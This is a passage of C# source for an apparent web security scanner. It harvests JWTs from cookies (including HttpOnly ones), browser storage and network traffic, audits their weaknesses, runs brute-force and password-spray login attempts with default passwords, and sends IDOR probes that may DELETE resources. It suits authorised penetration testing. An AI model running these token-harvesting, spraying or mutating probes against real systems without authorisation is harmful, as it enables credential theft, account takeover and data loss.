        var seen = new HashSet<string>(StringComparer.Ordinal);

        void addDiscoveredToken(string sourceName, string? text)
        {
            if (string.IsNullOrEmpty(text)) return;
            foreach (Match m in JwtLike.Matches(text))
            {
                if (!TryPrepareJwtSegments(m.Value, out var header, out var payload, out var signature))
                    continue;
                var token = CanonicalJwtForm(header, payload, signature);
                if (!seen.Add(token)) continue;
                var a = AnalyzeOneJwt(sourceName, token);
                if (a != null) result.Tokens.Add(a);
            }
        }

        void addExplicitToken(string raw)
        {
            if (!TryPrepareJwtSegments(raw, out var header, out var payload, out var signature))
                return;
            var token = CanonicalJwtForm(header, payload, signature);
            if (!seen.Add(token)) return;
            var a = AnalyzeOneJwt("requestBody", token);
            if (a != null) result.Tokens.Add(a);
        }

        if (root.TryGetProperty("cookies", out var c)) addDiscoveredToken("cookie", c.GetString());
        if (root.TryGetProperty("localStorage", out var loc) && loc.ValueKind == JsonValueKind.Object)
        {
            foreach (var p in loc.EnumerateObject())
                addDiscoveredToken($"localStorage.{p.Name}", p.Value.ValueKind == JsonValueKind.String ? p.Value.GetString() : p.Value.GetRawText());
        }
        if (root.TryGetProperty("sessionStorage", out var sess) && sess.ValueKind == JsonValueKind.Object)
        {
            foreach (var p in sess.EnumerateObject())
                addDiscoveredToken($"sessionStorage.{p.Name}", p.Value.ValueKind == JsonValueKind.String ? p.Value.GetString() : p.Value.GetRawText());
        }

        try
        {
            var idb = await ctx.GetIndexedDbFlat();
            foreach (var (k, v) in idb)
                addDiscoveredToken(k, v);
        }
        catch
        {
            // IndexedDB dump is best-effort.
        }

        // Also check HttpOnly cookies via the WebView2 CookieManager API —
        // document.cookie cannot see HttpOnly cookies but the browser cookie jar can.
        try
        {
            var browserCookies = await ctx.GetCookies();
            foreach (var cookie in browserCookies)
            {
                var isHttpOnly = cookie.TryGetValue("httpOnly", out var ho) && ho is true;
                var name = cookie.TryGetValue("name", out var n) ? n?.ToString() : null;
                var value = cookie.TryGetValue("value", out var v) ? v?.ToString() : null;
                if (string.IsNullOrEmpty(value)) continue;
                var label = isHttpOnly ? $"httpOnlyCookie:{name}" : $"cookie:{name}";
                addDiscoveredToken(label, value);
            }
        }
        catch
        {
            // CookieManager may not be available in all contexts; JS-based scan still covers non-HttpOnly cookies.
        }

        if (explicitTokens is { Count: > 0 })
        {
            foreach (var raw in explicitTokens)
            {
                if (string.IsNullOrWhiteSpace(raw)) continue;
                addExplicitToken(raw.Trim());
            }
        }

        // Harvest JWTs from login/API response headers and bodies in the network log
        // (Authorization, Set-Cookie, and JSON bodies often carry tokens that never touch storage).
        try
        {
            foreach (var entry in ctx.Network.Entries.TakeLast(80))
            {
                foreach (var kv in entry.ResponseHeaders)
                {
                    if (kv.Key.Equals("Authorization", StringComparison.OrdinalIgnoreCase)
                        || kv.Key.Equals("X-Auth-Token", StringComparison.OrdinalIgnoreCase)
                        || kv.Key.Equals("X-Access-Token", StringComparison.OrdinalIgnoreCase)
                        || kv.Key.Equals("Set-Cookie", StringComparison.OrdinalIgnoreCase))
                    {
                        addDiscoveredToken($"responseHeader:{kv.Key}:{TruncateUrl(entry.Url)}", kv.Value);
                    }
                }

                if (!string.IsNullOrEmpty(entry.ResponseBody)
                    && entry.StatusCode is >= 200 and < 400
                    && entry.ResponseBody.Contains("eyJ", StringComparison.Ordinal))
                {
                    addDiscoveredToken($"responseBody:{TruncateUrl(entry.Url)}", entry.ResponseBody);
                }
            }
        }
        catch
        {
            // Network log may be unavailable in some contexts.
        }

        return result;
    }

    private static string TruncateUrl(string url) =>
        url.Length <= 80 ? url : url[..80] + "…";

    private static JwtTokenAnalysis? AnalyzeOneJwt(string source, string token)
    {
        if (!TryPrepareJwtSegments(token, out var headerPart, out var payloadPart, out var signaturePart))
            return null;

        string? hdrJson = null, payJson = null;
        string? alg = null;
        try
        {
            hdrJson = Encoding.UTF8.GetString(Base64UrlDecode(headerPart));
            using var h = JsonDocument.Parse(hdrJson);
            if (h.RootElement.TryGetProperty("alg", out var algEl))
                alg = algEl.GetString();
        }
        catch { return null; }

        try
        {
            payJson = Encoding.UTF8.GetString(Base64UrlDecode(payloadPart));
        }
        catch { payJson = null; }

        var issues = new List<string>();
        var sensitive = new List<string>();
        DateTime? exp = null;

        if (string.Equals(alg, "none", StringComparison.OrdinalIgnoreCase))
            issues.Add("Algorithm is 'none' — token integrity is not protected.");

        if (string.IsNullOrEmpty(signaturePart)
            && !string.IsNullOrEmpty(alg)
            && !string.Equals(alg, "none", StringComparison.OrdinalIgnoreCase))
        {
            issues.Add("Signature segment is missing or empty — token may be incomplete or stripped for testing.");
        }

        if (string.Equals(alg, "HS256", StringComparison.OrdinalIgnoreCase))
            issues.Add("HS256 — verify strong signing secret rotation and that secrets are not exposed to clients.");

        if (string.Equals(alg, "RS256", StringComparison.OrdinalIgnoreCase))
            issues.Add("RS256 — verify server rejects algorithm confusion (e.g. HS256 with public key as HMAC secret).");

        if (hdrJson != null)
        {
            try
            {
                using var hdrDoc = JsonDocument.Parse(hdrJson);
                var hdr = hdrDoc.RootElement;
                if (hdr.TryGetProperty("jku", out var jkuEl) && jkuEl.ValueKind == JsonValueKind.String)
                {
                    var jku = jkuEl.GetString();
                    if (!string.IsNullOrWhiteSpace(jku))
                        issues.Add(
                            $"Header contains jku ('{jku}') — server may fetch signing keys from an attacker-controlled URL (key substitution / SSRF).");
                }

                if (hdr.TryGetProperty("x5u", out var x5uEl) && x5uEl.ValueKind == JsonValueKind.String)
                {
                    var x5u = x5uEl.GetString();
                    if (!string.IsNullOrWhiteSpace(x5u))
                        issues.Add(
                            $"Header contains x5u ('{x5u}') — server may fetch X.509 certificates from an attacker-controlled URL.");
                }

                if (hdr.TryGetProperty("kid", out var kidEl) && kidEl.ValueKind == JsonValueKind.String)
                {
                    var kid = kidEl.GetString();
                    if (!string.IsNullOrWhiteSpace(kid))
                    {
                        if (kid.Contains("../", StringComparison.Ordinal) || kid.Contains("..\\", StringComparison.Ordinal)
                            || kid.Contains('%') || kid.Contains('\'') || kid.Contains('"'))
                        {
                            issues.Add(
                                $"Header kid ('{kid}') contains suspicious characters — may enable path traversal or injection in JWKS lookup.");
                        }
                        else if (kid.Length > 64)
                        {
                            issues.Add(
                                $"Header kid is unusually long ({kid.Length} chars) — verify JWKS key lookup is not injectable.");
                        }
                    }
                }
            }
            catch { /* ignore malformed header json */ }
        }

        if (payJson != null)
        {
            try
            {
                using var pdoc = JsonDocument.Parse(payJson);
                var p = pdoc.RootElement;
                var hasExp = false;
                if (p.TryGetProperty("exp", out var expEl) && expEl.ValueKind == JsonValueKind.Number)
                {
                    hasExp = true;
                    var epoch = expEl.GetInt64();
                    exp = DateTimeOffset.FromUnixTimeSeconds(epoch).UtcDateTime;
                    if (exp < DateTime.UtcNow)
                        issues.Add("Token exp claim is in the past.");
                }
                else
                {
                    issues.Add("Token has no exp (expiration) claim — bearer tokens may never expire.");
                }

                if (p.TryGetProperty("iat", out _) && !hasExp)
                {
                    issues.Add("Token has iat (issued-at) but no exp — long-lived or non-expiring session token.");
                }

                CollectSensitiveFromPayloadElement(p, "", sensitive);

                if (sensitive.Any(s => s.Contains("md5-password-hash", StringComparison.OrdinalIgnoreCase)))
                {
                    issues.Add(
                        "JWT payload contains an MD5 password hash — cryptographically broken, unsalted, and replayable if the token leaks.");
                }
            }
            catch { /* ignore malformed payload json */ }
        }

        return new JwtTokenAnalysis
        {
            Source = source,
            FullToken = token,
            Raw = token.Length > 80 ? token[..40] + "…" + token[^20..] : token,
            HeaderAlg = alg,
            HeaderJson = hdrJson,
            PayloadJson = payJson,
            Issues = issues,
            SensitiveClaims = sensitive.Distinct(StringComparer.OrdinalIgnoreCase).ToList(),
            ExpiresUtc = exp
        };
    }

    /// <summary>Walk nested objects/arrays and stringified JSON so claims like <c>user.password</c> are not missed.</summary>
    private static void CollectSensitiveFromPayloadElement(JsonElement el, string path, List<string> sensitive)
    {
        switch (el.ValueKind)
        {
            case JsonValueKind.Object:
                foreach (var prop in el.EnumerateObject())
                {
                    var name = prop.Name;
                    var childPath = string.IsNullOrEmpty(path) ? name : $"{path}.{name}";
                    if (SensitiveClaimName(name))
                        sensitive.Add(childPath);
                    var child = prop.Value;
                    if (child.ValueKind == JsonValueKind.Object)
                        CollectSensitiveFromPayloadElement(child, childPath, sensitive);
                    else if (child.ValueKind == JsonValueKind.Array)
                    {
                        var i = 0;
                        foreach (var item in child.EnumerateArray())
                        {
                            CollectSensitiveFromPayloadElement(item, $"{childPath}[{i}]", sensitive);
                            i++;
                        }
                    }
                    else
                        MaybeAddHashLikeClaim(childPath, child, sensitive);
                }
                return;
            case JsonValueKind.Array:
            {
                var i = 0;
                foreach (var item in el.EnumerateArray())
                {
                    CollectSensitiveFromPayloadElement(item, $"{path}[{i}]", sensitive);
                    i++;
                }
            }
            return;
            default:
                MaybeAddHashLikeClaim(path, el, sensitive);
                return;
        }
    }

    private static void MaybeAddHashLikeClaim(string path, JsonElement el, List<string> sensitive)
    {
        if (el.ValueKind == JsonValueKind.String)
        {
            var full = el.GetString();
            if (string.IsNullOrEmpty(full)) return;
            var val = full.Length > 400 ? full[..400] + "…" : full;
            if (TryClassifyPasswordHash(path, val, out var tag))
                sensitive.Add($"{path}:{tag}");
            if (full.Length > 1 && (full[0] == '{' || full[0] == '['))
            {
                try
                {
                    using var inner = JsonDocument.Parse(full);
                    CollectSensitiveFromPayloadElement(inner.RootElement, path, sensitive);
                }
                catch
                {
                    // not valid JSON; ignore
                }
            }
            return;
        }

        if (el.ValueKind is JsonValueKind.Number or JsonValueKind.True or JsonValueKind.False)
        {
            var val = el.ValueKind == JsonValueKind.Number ? el.GetRawText() : el.GetBoolean() ? "true" : "false";
            if (val.Length > 400) val = val[..400] + "…";
            if (TryClassifyPasswordHash(path, val, out var tag))
                sensitive.Add($"{path}:{tag}");
        }
    }

    private static bool TryClassifyPasswordHash(string path, string value, out string tag)
    {
        tag = "value-looks-like-hash";
        if (string.IsNullOrWhiteSpace(value) || value.Length < 20) return false;

        if (value.StartsWith("$2", StringComparison.Ordinal)
            || value.StartsWith("$argon2", StringComparison.OrdinalIgnoreCase))
        {
            tag = "bcrypt-or-argon2-hash";
            return true;
        }

        if (Regex.IsMatch(value, @"^[0-9a-f]{32}$", RegexOptions.IgnoreCase)
            && path.Contains("password", StringComparison.OrdinalIgnoreCase))
        {
            tag = "md5-password-hash";
            return true;
        }

        if (Regex.IsMatch(value, @"^[0-9a-f]{40}$", RegexOptions.IgnoreCase)
            && path.Contains("password", StringComparison.OrdinalIgnoreCase))
        {
            tag = "sha1-password-hash";
            return true;
        }

        if (Regex.IsMatch(value, @"^[0-9a-f]{64}$", RegexOptions.IgnoreCase)
            && path.Contains("password", StringComparison.OrdinalIgnoreCase))
        {
            tag = "sha256-password-hash";
            return true;
        }

        return LooksLikePasswordHash(value);
    }

    private static bool SensitiveClaimName(string name)
    {
        if (name.Equals("hash", StringComparison.OrdinalIgnoreCase) ||
            name.Equals("dob", StringComparison.OrdinalIgnoreCase) ||
            name.Equals("ssn", StringComparison.OrdinalIgnoreCase) ||
            name.Equals("pwd", StringComparison.OrdinalIgnoreCase))
            return true;

        return name.Contains("password", StringComparison.OrdinalIgnoreCase)
            || name.Contains("passwd", StringComparison.OrdinalIgnoreCase)
            || name.Contains("secret", StringComparison.OrdinalIgnoreCase)
            || name.Contains("credential", StringComparison.OrdinalIgnoreCase)
            || name.Contains("apikey", StringComparison.OrdinalIgnoreCase)
            || name.Contains("api_key", StringComparison.OrdinalIgnoreCase)
            || name.Contains("privatekey", StringComparison.OrdinalIgnoreCase)
            || name.Contains("private_key", StringComparison.OrdinalIgnoreCase)
            || name.Contains("passwordhash", StringComparison.OrdinalIgnoreCase)
            || name.Contains("ssn", StringComparison.OrdinalIgnoreCase)
            || name.Contains("dob", StringComparison.OrdinalIgnoreCase)
            || name.Contains("creditcard", StringComparison.OrdinalIgnoreCase)
            || name.Contains("credit", StringComparison.OrdinalIgnoreCase);
    }

    private static bool LooksLikePasswordHash(string s)
    {
        if (s.Length < 20) return false;
        return s.StartsWith("$2", StringComparison.Ordinal)
            || Regex.IsMatch(s, @"^[0-9a-f]{32,64}$", RegexOptions.IgnoreCase);
    }

    private static byte[] Base64UrlDecode(string s)
    {
        s = s.Replace('-', '+').Replace('_', '/');
        switch (s.Length % 4)
        {
            case 2: s += "=="; break;
            case 3: s += "="; break;
        }
        return Convert.FromBase64String(s);
    }

    private static string Base64UrlEncode(byte[] bytes) =>
        Convert.ToBase64String(bytes).TrimEnd('=').Replace('+', '-').Replace('/', '_');

    public sealed class BruteForceSprayRow
    {
        public string Username { get; init; } = "";
        public int Status { get; init; }
        public int BodyLength { get; init; }
        public long DurationMs { get; init; }
        public bool SuccessSuspected { get; init; }
        public string? BodySnippet { get; init; }
    }

    public sealed class BruteForceResult
    {
        public List<BruteForceAttempt> Attempts { get; init; } = [];
        public List<BruteForceSprayRow> SprayRows { get; init; } = [];
        public List<string> Observations { get; init; } = [];
        public bool LockoutOrRateLimitSuspected { get; init; }
        public bool SprayMode { get; init; }
        public bool PerUserLockoutSuspected { get; init; }
        public int SuccessCount { get; init; }
    }

    public sealed class BruteForceAttempt
    {
        public int Index { get; init; }
        public int Status { get; init; }
        public int BodyLength { get; init; }
        public long DurationMs { get; init; }
        public string? BodySnippet { get; init; }
    }

    public static async Task<BruteForceResult> RunBruteForceAsync(
        AutomationContext ctx,
        string url,
        string method,
        Dictionary<string, string>? headers,
        string? bodyTemplate,
        string passwordPlaceholder,
        string wrongPassword,
        int attempts,
        int delayMs,
        int timeoutMs,
        CancellationToken ct = default)
    {
        attempts = Math.Clamp(attempts, 1, 50);
        method = string.IsNullOrWhiteSpace(method) ? "POST" : method.Trim().ToUpperInvariant();
        var attemptsList = new List<BruteForceAttempt>();
        var observations = new List<string>();
        var statuses = new List<int>();

        for (var i = 0; i < attempts; i++)
        {
            ct.ThrowIfCancellationRequested();
            var body = bodyTemplate?.Replace(passwordPlaceholder, wrongPassword, StringComparison.Ordinal);
            var sw = Stopwatch.StartNew();
            var json = await ctx.Fetch(url, method, headers, body, timeoutMs);
            sw.Stop();
            var (status, text, _) = ParseFetchJson(json);
            statuses.Add(status);
            var snippet = text.Length > 160 ? text[..160] : text;
            attemptsList.Add(new BruteForceAttempt
            {
                Index = i,
                Status = status,
                BodyLength = text.Length,
                DurationMs = sw.ElapsedMilliseconds,
                BodySnippet = snippet.Replace('\r', ' ').Replace('\n', ' ')
            });
            if (delayMs > 0 && i < attempts - 1)
                await Task.Delay(delayMs, ct);
        }

        var lockout = false;
        if (statuses.Any(s => s == 429))
        {
            observations.Add("HTTP 429 observed — rate limiting may be active.");
            lockout = true;
        }

        var textLower = string.Join(" ", attemptsList.Select(a => a.BodySnippet ?? "")).ToLowerInvariant();
        if (textLower.Contains("too many") || textLower.Contains("rate limit") || textLower.Contains("locked")
            || textLower.Contains("lockout") || textLower.Contains("try again later") || textLower.Contains("captcha"))
        {
            observations.Add("Response text suggests throttling, lockout, or CAPTCHA after failures.");
            lockout = true;
        }

        if (attemptsList.Count >= 3)
        {
            var durs = attemptsList.Select(a => (double)a.DurationMs).ToList();
            var avg = durs.Average();
            var last = durs[^1];
            if (last > avg * 2.5 && avg > 50)
                observations.Add("Later attempts measurably slower — possible backoff/throttling (heuristic).");
        }

        if (observations.Count == 0)
            observations.Add("No strong lockout/rate-limit signal — review status codes, timings, and snippets manually.");

        return new BruteForceResult
        {
            Attempts = attemptsList,
            Observations = observations,
            LockoutOrRateLimitSuspected = lockout
        };
    }

    /// <summary>
    /// Password spray: one password (or rotating list) across many usernames — credential-stuffing style.
    /// </summary>
    public static async Task<BruteForceResult> RunPasswordSprayAsync(
        AutomationContext ctx,
        string url,
        string method,
        Dictionary<string, string>? headers,
        string? bodyTemplate,
        string userPlaceholder,
        string passwordPlaceholder,
        IReadOnlyList<string> usernames,
        IReadOnlyList<string> passwords,
        int delayMs,
        int timeoutMs,
        CancellationToken ct = default)
    {
        if (usernames.Count == 0)
            throw new ArgumentException("usernames must not be empty for password spray mode.");

        var passList = passwords.Count > 0 ? passwords : ["Password123!", "Welcome1", "admin123"];
        var sprayRows = new List<BruteForceSprayRow>();
        var observations = new List<string>();
        var statuses = new List<int>();
        var successCount = 0;
        var lockoutStatuses = 0;

        for (var i = 0; i < usernames.Count; i++)
        {
            ct.ThrowIfCancellationRequested();
            var user = usernames[i];
            var pass = passList[i % passList.Count];
            var body = bodyTemplate?
                .Replace(userPlaceholder, user, StringComparison.Ordinal)
                .Replace("{{USER}}", user, StringComparison.OrdinalIgnoreCase)
                .Replace(passwordPlaceholder, pass, StringComparison.Ordinal)
                .Replace("{{PASSWORD}}", pass, StringComparison.OrdinalIgnoreCase);

            var sw = Stopwatch.StartNew();
            var json = await ctx.Fetch(url, method, headers, body, timeoutMs);
            sw.Stop();
            var (status, text, _) = ParseFetchJson(json);
            statuses.Add(status);
            if (status == 429) lockoutStatuses++;

            var lower = text.ToLowerInvariant();
            var success = status is >= 200 and < 300
                            && !lower.Contains("invalid password")
                            && !lower.Contains("incorrect")
                            && !lower.Contains("authentication failed")
                            && (lower.Contains("token") || lower.Contains("authentication") || lower.Contains("welcome"));

            if (success) successCount++;

            sprayRows.Add(new BruteForceSprayRow
            {
                Username = user,
                Status = status,
                BodyLength = text.Length,
                DurationMs = sw.ElapsedMilliseconds,
                SuccessSuspected = success,
                BodySnippet = text.Length > 120 ? text[..120] : text
            });

            if (delayMs > 0 && i < usernames.Count - 1)
                await Task.Delay(delayMs, ct);
        }

        var globalRateLimit = statuses.Any(s => s == 429);
        if (globalRateLimit)
            observations.Add("HTTP 429 observed during spray — global rate limiting may be active.");

        var perUserLockout = lockoutStatuses >= 2 && lockoutStatuses < statuses.Count;
        if (perUserLockout)
            observations.Add("Intermittent 429 responses suggest per-user or progressive lockout.");

        if (successCount > 0)
            observations.Add($"{successCount} username(s) returned login-success markers during spray.");

        if (observations.Count == 0)
            observations.Add("No strong lockout signal during spray — review per-user status codes.");

        return new BruteForceResult
        {
            SprayMode = true,
            SprayRows = sprayRows,
            Observations = observations,
            LockoutOrRateLimitSuspected = globalRateLimit,
            PerUserLockoutSuspected = perUserLockout,
            SuccessCount = successCount
        };
    }

    public sealed class IdorPlannedRequest
    {
        public string Method { get; init; } = "";
        public string Url { get; init; } = "";
    }

    public sealed class IdorScanResult
    {
        public List<IdorRow> Rows { get; init; } = [];
        public List<string> Summary { get; init; } = [];
        /// <summary>True when no HTTP requests were executed (see <see cref="PlannedRequests"/>).</summary>
        public bool DryRun { get; init; }
        public List<IdorPlannedRequest> PlannedRequests { get; init; } = [];
    }

    public sealed class IdorRow
    {
        public string Id { get; init; } = "";
        public string Method { get; init; } = "GET";
        public string Url { get; init; } = "";
        public int Status { get; init; }
        public int BodyLength { get; init; }
        public string Fingerprint { get; init; } = "";

        /// <summary>SHA-prefix of noise-stripped body (see <see cref="ResponseBodySecurityHeuristics.CanonicalSecurityEvidenceHash"/>).</summary>
        public string StrippedEvidenceHash { get; init; } = "";

        /// <summary>Truncated raw body retained for auto-scan diffs — only when scan requested evidence capture.</summary>
        public string? BodySample { get; init; }
    }

    public static async Task<IdorScanResult> RunIdorScanAsync(
        AutomationContext ctx,
        string urlTemplate,
        string method,
        Dictionary<string, string>? headers,
        string? bodyTemplate,
        IReadOnlyList<string> ids,
        int timeoutMs,
        IReadOnlyList<string>? methods = null,
        bool inferMethodsFromNetwork = true,
        bool includeMutatingProbes = false,
        bool readOnlyProbes = false,
        bool dryRun = false,
        bool retainResponseBodiesForEvidence = false,
        CancellationToken ct = default)
    {
        var primary = string.IsNullOrWhiteSpace(method) ? "GET" : method.Trim().ToUpperInvariant();
        var markers = RequestMarkerSubstitute.ListMarkers(urlTemplate, bodyTemplate);
        if (markers.Count != 1)
            throw new ArgumentException("IDOR scan expects exactly one §id§ or {{id}} marker in url or body.");

        var idName = markers[0];
        var toRun = ResolveIdorHttpMethods(
            primary, urlTemplate, bodyTemplate, ctx, methods, inferMethodsFromNetwork, includeMutatingProbes);
        if (toRun.Count == 0) toRun = [primary];

        if (readOnlyProbes)
        {
            var hs = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            foreach (var m in toRun)
            {
                if (m is "GET" or "HEAD" or "OPTIONS")
                    hs.Add(m);
            }

            hs.Add("GET");
            toRun = hs.OrderBy(m => string.Equals(m, primary, StringComparison.OrdinalIgnoreCase) ? 0 : 1)
                .ThenBy(m => m, StringComparer.OrdinalIgnoreCase).ToList();
        }

        var result = new IdorScanResult();

        if (includeMutatingProbes && !readOnlyProbes)
            result.Summary.Add(
                "WARNING: Mutating IDOR probes are enabled — PUT/PATCH/DELETE may modify or DELETE real resources.");

        if (dryRun)
        {
            var planned = new List<IdorPlannedRequest>();
            foreach (var m in toRun)
            {
                foreach (var id in ids)
                {
                    ct.ThrowIfCancellationRequested();
                    var dict = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase) { [idName] = id };
                    var u = RequestMarkerSubstitute.ReplaceNamed(urlTemplate, dict);
                    planned.Add(new IdorPlannedRequest { Method = m, Url = u });
                }
            }

            var summary = new List<string>();
            if (includeMutatingProbes && !readOnlyProbes)
                summary.Add(
                    "WARNING: Mutating IDOR probes are enabled — PUT/PATCH/DELETE may modify or DELETE real resources.");
            summary.Add($"Dry run: {planned.Count} HTTP requests would be sent (no traffic executed).");
            return new IdorScanResult
            {
                Rows = [],
                Summary = summary,
                DryRun = true,
                PlannedRequests = planned
            };
        }

        foreach (var m in toRun)
        {
            foreach (var id in ids)
            {
                ct.ThrowIfCancellationRequested();
                var dict = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase) { [idName] = id };
                var u = RequestMarkerSubstitute.ReplaceNamed(urlTemplate, dict);
                var b = bodyTemplate != null ? SubstituteSqliBody(bodyTemplate, id, headers) : null;
                var json = await ctx.Fetch(u, m, headers, b, timeoutMs);
                var (status, text, _) = ParseFetchJson(json);
                var stripped = ResponseBodySecurityHeuristics.CanonicalSecurityEvidenceHash(text);
                var fp = ResponseBodySecurityHeuristics.ResponseFingerprint(status, text);
                var bodyRetain = retainResponseBodiesForEvidence
                    ? ResponseBodySecurityHeuristics.ClampBody(text, 8192)
                    : null;

                result.Rows.Add(new IdorRow
                {
                    Id = id,
                    Method = m,
                    Url = u,
                    Status = status,
                    BodyLength = text.Length,
                    Fingerprint = fp,
                    StrippedEvidenceHash = stripped,
                    BodySample = bodyRetain
                });
            }
        }

        if (toRun.Count > 1)
            result.Summary.Add("Probed HTTP methods: " + string.Join(", ", toRun) + " (network-inferred and/or mutating method fallbacks when enabled).");

        var okRows = result.Rows.Where(r => r.Status == 200).ToList();
        if (okRows.Count >= 2)
        {
            var distinctFp = okRows.Select(r => r.Fingerprint).Distinct().Count();
            if (distinctFp >= 2)
                result.Summary.Add("Multiple 200 responses with different body fingerprints — possible IDOR or inconsistent authorization (heuristic).");
        }

        if (result.Rows.Any(r => r.Status is >= 200 and < 300) && result.Rows.Any(r => r.Status == 403))
            result.Summary.Add("Mix of success and 403 across IDs or methods — compare authorized vs unauthorized behavior.");

        if (result.Summary.Count == 0)
            result.Summary.Add("No strong IDOR heuristic tripped — inspect rows and fingerprints manually.");

        return result;
    }

    /// <summary>HTTP methods that change server state when replayed against resource URLs.</summary>
    private static bool IsMutatingIdorMethod(string m)
    {
        m = m.Trim().ToUpperInvariant();
        return m is "POST" or "PUT" or "PATCH" or "DELETE";
    }

    /// <summary>Resolves the method list: explicit <paramref name="methodsOverride"/> wins; otherwise network log + mutating fallbacks + primary method.</summary>
    private static List<string> ResolveIdorHttpMethods(
        string primaryMethod,
        string urlTemplate,
        string? bodyTemplate,
        AutomationContext ctx,
        IReadOnlyList<string>? methodsOverride,
        bool inferFromNetwork,
        bool includeMutating)
    {
        var allowed = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
        {
            "GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"
        };
        void add(HashSet<string> set, string m)
        {
            m = m.Trim().ToUpperInvariant();
            if (allowed.Contains(m) && m != "OPTIONS" && m != "HEAD")
                set.Add(m);
        }

        var primary = string.IsNullOrWhiteSpace(primaryMethod) ? "GET" : primaryMethod.Trim().ToUpperInvariant();
        if (!includeMutating && IsMutatingIdorMethod(primary))
            primary = "GET";

        if (methodsOverride is { Count: > 0 })
        {
            var list = new List<string>();
            var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            foreach (var m in methodsOverride)
            {
                var u = m.Trim().ToUpperInvariant();
                if (!allowed.Contains(u) || u is "OPTIONS" or "HEAD") continue;
                if (!includeMutating && IsMutatingIdorMethod(u)) continue;
                if (seen.Add(u)) list.Add(u);
            }
            if (list.Count == 0) list.Add(primary);
            return list;
        }

        var set2 = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        add(set2, primary);

        if (inferFromNetwork)
        {
            var pathKey = ComputeUrlPathKeyForIdorMatch(urlTemplate, bodyTemplate);
            if (!string.IsNullOrEmpty(pathKey) && pathKey != "/")
            {
                string? host = null;
                if (Uri.TryCreate(RequestMarkerSubstitute.ReplaceAll(urlTemplate, "0"), UriKind.Absolute, out var su))
                    host = su.Host;
                foreach (var e in ctx.GetNetworkLog())
                {
                    if (string.IsNullOrEmpty(e.Method)) continue;
                    if (!includeMutating && IsMutatingIdorMethod(e.Method)) continue;
                    if (!string.IsNullOrEmpty(host) && e.Host.Length > 0
                        && !string.Equals(e.Host, host, StringComparison.OrdinalIgnoreCase)) continue;
                    if (!Uri.TryCreate(e.Url, UriKind.Absolute, out var eu)) continue;
                    var p = NormalizePathKey(eu.AbsolutePath);
                    var k = pathKey;
                    if (p.Equals(k, StringComparison.OrdinalIgnoreCase) || p.StartsWith(k + "/", StringComparison.OrdinalIgnoreCase)
                        || (k.Length > 0 && p.StartsWith(k, StringComparison.OrdinalIgnoreCase)))
                    {
                        add(set2, e.Method);
                    }
                }
            }
        }

        if (includeMutating)
        {
            add(set2, "PUT");
            add(set2, "PATCH");
            add(set2, "DELETE");
        }

        if (set2.Count == 0) set2.Add(primary);
        return set2.OrderBy(m => m == primary ? 0 : 1).ThenBy(m => m).ToList();
    }

    private static string ComputeUrlPathKeyForIdorMatch(string urlTemplate, string? bodyTemplate)
    {
        var markers = RequestMarkerSubstitute.ListMarkers(urlTemplate, bodyTemplate);
        if (markers.Count == 0) return "";
        var empty = markers.ToDictionary(m => m, _ => "", StringComparer.OrdinalIgnoreCase);
        var u = RequestMarkerSubstitute.ReplaceNamed(urlTemplate, empty);
        if (!Uri.TryCreate(u, UriKind.Absolute, out var uri)) return "";
        return NormalizePathKey(uri.AbsolutePath);
    }

    private static string NormalizePathKey(string p)
    {
        while (p.Contains("//", StringComparison.Ordinal)) p = p.Replace("//", "/", StringComparison.Ordinal);
        return p.TrimEnd('/');
    }

    /// <summary>
    /// State-changing sinks (POST review/comment/etc.) often append the payload into the page.
    /// Length/hash deltas and UNION-column ladder splits then look like SQLi oracles.
    /// Keep only SQL error signatures, auth-bypass, time-based, or boolean pairs that remain
    /// asymmetric after neutralizing the stored payload echo.
    /// </summary>
    private static void ApplySqliMutatingContentCreateFalsePositiveHeuristics(
        List<SqliScanRow> rows,
        string baselineBody,
        string baselineStrippedHash)
    {
        if (rows.Count == 0) return;

        foreach (var r in rows)
        {
            if (r.SqlHits.Count > 0) continue;
            if (r.Types.Contains("auth-bypass-suspected", StringComparer.OrdinalIgnoreCase)
                || r.Types.Contains("time-based-suspected", StringComparer.OrdinalIgnoreCase))
                continue;

            var sample = string.IsNullOrEmpty(r.ProbeEvidenceSample) ? (r.Body ?? "") : r.ProbeEvidenceSample;
            var neutralized = NeutralizePayloadReflection(sample, r.Payload);
            var neutralizedHash = ResponseBodySecurityHeuristics.CanonicalSecurityEvidenceHash(neutralized);
            var echoExplainsDelta = !string.IsNullOrEmpty(baselineStrippedHash)
                && string.Equals(neutralizedHash, baselineStrippedHash, StringComparison.Ordinal);
            var lengthGrowthLooksLikeAppend =
                r.BodyLength > baselineBody.Length
                && (r.BodyLength - baselineBody.Length) <= Math.Max(r.Payload.Length * 4, 64)
                && sample.Contains(r.Payload, StringComparison.OrdinalIgnoreCase);

            var looksLikeStoredEcho = echoExplainsDelta || lengthGrowthLooksLikeAppend;
            if (!looksLikeStoredEcho) continue;

            // Drop length/hash-only union & boolean promotions; keep error-based if it appears later.
            StripSqliHeuristicTypes(r, "union-based");
            StripSqliHeuristicTypes(r, "union-column-match");
            StripSqliHeuristicTypes(r, "union-leak-suspected");
            StripSqliHeuristicTypes(r, "blind-boolean-suspected");
            StripSqliHeuristicTypes(r, "blind-boolean-confirmed");
        }
    }

    /// <summary>
    /// Post-scan reduction for noisy framework shells: avoids CRITICAL-looking "union-based" classifications when
    /// the UNION token is echoed from the probe (Flight/RSC payloads) rather than originating from DB errors.
    /// </summary>
    private static void ApplySqliUnionAndNextJsFlightFalsePositiveHeuristics(List<SqliScanRow> rows, string baselineBody)
    {
        foreach (var r in rows)
        {
            if (!r.Types.Contains("union-based", StringComparer.OrdinalIgnoreCase)) continue;
            var sample = string.IsNullOrEmpty(r.ProbeEvidenceSample)
                ? (r.Body ?? "")
                : r.ProbeEvidenceSample;

            if (SqliUnionKeywordLikelyReflectionOnly(sample, baselineBody, r.Payload, r.SqlHits))
                StripSqliHeuristicTypes(r, "union-based");
            else if (ResponseBodySecurityHeuristics.BodySuggestsNextJsRscFlight(sample)
                     && ResponseBodySecurityHeuristics.BodySuggestsNextJsRscFlight(baselineBody)
                     && r.SqlHits.Count == 0)
            {
                // Next.js/App Router shells embed param-derived text in Flight chunks without SQL leakage.
                StripSqliHeuristicTypes(r, "union-based");
            }
        }
    }

    /// <summary>
